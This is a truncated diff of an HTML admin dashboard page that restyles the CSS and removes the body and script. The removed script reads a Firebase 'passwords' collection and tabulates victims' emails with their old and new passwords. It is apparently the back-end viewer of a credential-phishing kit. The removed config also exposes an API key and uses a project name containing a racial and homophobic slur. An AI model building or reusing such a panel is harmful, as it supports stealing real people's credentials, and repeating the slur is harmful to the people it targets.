@@ -5,57 +5,50 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Dashboard</title>
   <style>
+    /* Global styles */
     body {
       font-family: 'Roboto', sans-serif;
-      background-color: #f8f9fa;
       margin: 0;
       padding: 0;
+      background-color: #f8f9fa;
     }
+
+    /* Header */
     .header {
       background-color: #343a40;
-      color: white;
-      padding: 20px;
+      color: #ffffff;
+      padding: 15px;
       text-align: center;
     }
+
+    .header h1 {
+      margin: 0;
+      font-size: 24px;
+    }
+
+    /* Container */
     .container {
-      margin: 30px auto;
-      width: 90%;
       max-width: 1200px;
-      background: white;
+      margin: 20px auto;
       padding: 20px;
+      background-color: #ffffff;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-    h1, h2 {
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 22px;
       text-align: center;
     }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
-      font-size: 16px;
-    }
-    th, td {
-      padding: 12px 15px;
-      border: 1px solid #ddd;
-      text-align: left;
-    }
-    th {
-      background-color: #007bff;
-      color: white;
-      text-transform: uppercase;
-    }
-    tr:nth-child(even) {
-      background-color: #f2f2f2;
-    }
-    tr:hover {
-      background-color: #e9ecef;
-    }
+
+    /* Actions */
     .actions {
       display: flex;
       justify-content: flex-end;
       margin-bottom: 10px;
     }
+
     .delete-btn {
       background-color: #dc3545;
       color: white;
@@ -65,119 +58,52 @@
       border-radius: 5px;
       cursor: pointer;
       display: none;
+      transition: background-color 0.3s;
     }
+
     .delete-btn:hover {
       background-color: #c82333;
     }
-  </style>
-</head>
-<body>
-  <div class="header">
-    <h1>Admin Dashboard</h1>
-  </div>
 
-  <div class="container">
-    <h2>User Details</h2>
-    <div class="actions">
-      <button id="deleteBtn" class="delete-btn">Delete Selected</button>
-    </div>
-    <table>
-      <thead>
-        <tr>
-          <th>Select</th>
-          <th>Email</th>
-          <th>Old Password</th>
-          <th>New Password</th>
-        </tr>
-      </thead>
-      <tbody id="userTable">
-        <!-- Dynamic data will be inserted here -->
-      </tbody>
-    </table>
-  </div>
+    /* Table */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 16px;
+      overflow-x: auto;
+    }
 
-  <div class="footer">
-    © 2025 Admin Dashboard. All rights reserved.
-  </div>
+    th, td {
+      padding: 12px 15px;
+      border: 1px solid #ddd;
+      text-align: left;
+    }
 
-  <script type="module">
-    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
-    import { getFirestore, collection, query, orderBy, getDocs, deleteDoc, doc } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
+    th {
+      background-color: #007bff;
+      color: #ffffff;
+      text-transform: uppercase;
+    }
 
-    // Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
-      authDomain: "gay-ass-nigga.firebaseapp.com",
-      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
-      projectId: "gay-ass-nigga",
-      storageBucket: "gay-ass-nigga.appspot.com",
-      messagingSenderId: "740449529935",
-      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
-    };
+    tr:nth-child(even) {
+      background-color: #f2f2f2;
+    }
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    tr:hover {
+      background-color: #e9ecef;
+    }
 
-    // Fetch and display user data sorted by timestamp (most recent first)
-    const userTable = document.getElementById('userTable');
-    const deleteBtn = document.getElementById('deleteBtn');
-
-    async function loadUserData() {
-      try {
-        const q = query(collection(db, 'passwords'), orderBy('timestamp', 'desc'));
-        const querySnapshot = await getDocs(q);
-
-        querySnapshot.forEach((doc) => {
-          const data = doc.data();
-          const row = `
-            <tr>
-              <td><input type="checkbox" class="select-row" data-id="${doc.id}"></td>
-              <td>${data.email}</td>
-              <td>${data.oldPassword}</td>
-              <td>${data.newPassword}</td>
-            </tr>
-          `;
-          userTable.insertAdjacentHTML('beforeend', row);
-        });
-
-        addCheckboxListeners();
-      } catch (error) {
-        console.error("Error loading user data:", error);
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      th, td {
+        font-size: 14px;
+        padding: 10px;
+      }
+      .delete-btn {
+        font-size: 12px;
+        padding: 8px 12px;
       }
     }
 
-    // Show delete button when a checkbox is selected
-    function addCheckboxListeners() {
-      const checkboxes = document.querySelectorAll('.select-row');
-      checkboxes.forEach((checkbox) => {
-        checkbox.addEventListener('change', () => {
-          const anyChecked = Array.from(checkboxes).some((cb) => cb.checked);
-          deleteBtn.style.display = anyChecked ? 'inline-block' : 'none';
-        });
-      });
-    }
-
-    // Delete selected users
-    deleteBtn.addEventListener('click', async () => {
-      const selectedRows = document.querySelectorAll('.select-row:checked');
-      const idsToDelete = Array.from(selectedRows).map((row) => row.dataset.id);
-
-      if (idsToDelete.length > 0 && confirm('Are you sure you want to delete the selected users?')) {
-        try {
-          await Promise.all(
-            idsToDelete.map((id) => deleteDoc(doc(db, 'passwords', id)))
-          );
-          alert('Selected users deleted successfully.');
-          location.reload(); // Refresh the page to update the table
-        } catch (error) {
-          console.error("Error deleting users:", error);
-        }
-      }
-    });
-
-    // Load user data on page load
-    loadUserData();
-  </script>
-</body>
-</html>
+    @media (max-width: 480px) {
+      .
